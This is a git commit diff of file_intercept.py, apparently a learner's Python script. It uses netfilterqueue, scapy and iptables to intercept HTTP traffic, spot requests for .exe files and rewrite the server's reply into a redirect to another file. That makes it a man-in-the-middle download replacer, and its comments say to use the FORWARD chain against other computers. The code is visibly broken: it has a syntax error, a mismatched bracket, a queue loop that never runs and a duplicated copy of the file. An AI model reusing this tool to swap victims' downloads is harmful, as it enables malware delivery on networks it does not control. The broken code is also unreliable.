ddf23af20ea9ec7db0153fc62d1e7f81c1048a9e
syntax-eror <46492218+syntax-eror@users.noreply.github.com>
2019-07-09 19:38:01 -0700

    Update file_intercept.py

--- file_intercept.py
+++ file_intercept.py
@@ -2,21 +2,73 @@
 
 #doesn't actually work in python3 currently, errors about str being returned instead of bytes-like object
 
-#iptables -I FORWARD -j NFQUEUE --queue-num 0
-#iptables --flush - delete rules set up
-#iptables -I OUTPUT -j NFQUEUE --queue-num 0
-#set up for your own computer
+import netfilterqueue
+import scapy.all as scapy
+import subprocess
 
+ack_list = [] #initiliaze outside of function, otherwise it will reinitialize for every packet
+
+def set_iptables(): #automate setting IPtables for testing on localhost
+    print("\n[+] Setting up IPTables\n")
+    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
+    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
+    
+def restore_iptables():
+    print("\n[+] Flushing IPTables\n")
+    subprocess.call(["iptables", "--flush"])
+    
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.Raw):
+        if scapy_packet[scapy.TCP].dport == 80:
+            print("\nHTTP Request outbound found:\n")
+            print(scapy_packet.show())
+            if ".exe" in scapy_packet[scapy.Raw].load:
+                print("EXE found")
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+                print(scapy_packet.show())
+        elif scapy_packet[scapy.TCP].sport = 80: #if this exists, packet is HTTP response inbound
+            if scapy_packet[scapy.TCP].seq in ack_list: #if SEQ is in ack list, there are packets that match
+                print("++Replacing file")
+                if scapy_packet[scapy.TCP].seq in ack_list:
+                    ack_list.remove(scapy_packet[scapy.TCP].seq) #remove from list since it's no
+                    #longer needed once it's printed
+                    scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://testhtml5.vulnweb.com/static/img/logo2.png"
+                    del scapy_packet[scapy.IP].len
+                    del scapy_packet[scapy.IP].chksum
+                    del scapy_packet[scapy.TCP].chksum
+                    packet.set_payload(str(scapy_packet))
+
+    packet.accept() #forward packets to target, connectivity seems normal
+
+try:
+    while True:
+        set_iptables()
+        queue = netfilterqueue.NetfilterQueue()
+        queue.bind(0, process_packet)
+        queue.run
+except KeyboardInterrupt:
+    print("\n[+] Stopping file download interceptor")
+    restore_iptables()
+    
+    
+#messy commented code below
+#iptables -I FORWARD -j NFQUEUE --queue-num 0
+#iptables -I INPUT -j NFQUEUE --queue-num 0
+#iptables -I OUTPUT -j NFQUEUE --queue-num 0
+#iptables --flush - delete rules set up
+#INPUT and OUTPUT chains to test on your own computer
+#FORWARD chain to use on other computers
 
 import netfilterqueue
-#need to have module installed - pip3 install netfilterqueue
+#need to have module installed - pip install netfilterqueue / pip3 install
 #apt-get install build-essential python-dev libnetfilter-queue-dev if errors
 import scapy.all as scapy
 import subprocess
 
-ack_list = [] #
+ack_list = [] #initiliaze outside of function, otherwise it will reinitialize for every packet
 
-def set_iptables():
+def set_iptables(): #automate setting up iptables chains for testing on own computer
     print("\n[+] Setting up IPTables\n")
     #python3 code:
     #subprocess.run(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
@@ -56,8 +108,11 @@ def process_packet(packet):
                     del scapy_packet(scapy.TCP].chksum
                     #remove checksum fields so packets won't be corrupted
                     #scapy auotmatically regenerates them
-                #print("\nHTTP Response inbound found:\n")
-                #print(scapy_packet.show())
+                    #print("\nHTTP Response inbound found:\n")
+                    #print(scapy_packet.show())
+                    
+                    packet.set_payload(str(scapy_packet)) #scapy method - convert packet to a string and set
+                    #it as a payload to be sent
             
         #print(scapy_packet.show()) #print out any packet with a RAW layer;
         #this will show packets that have HTTP requests, so it can be narrowed
@@ -79,3 +134,4 @@ except KeyboardInterrupt:
     restore_iptables()
 #all packets received will be put in the queue that was set up
 #on target computer, connectivity will be interrupted as each packet is being held
+
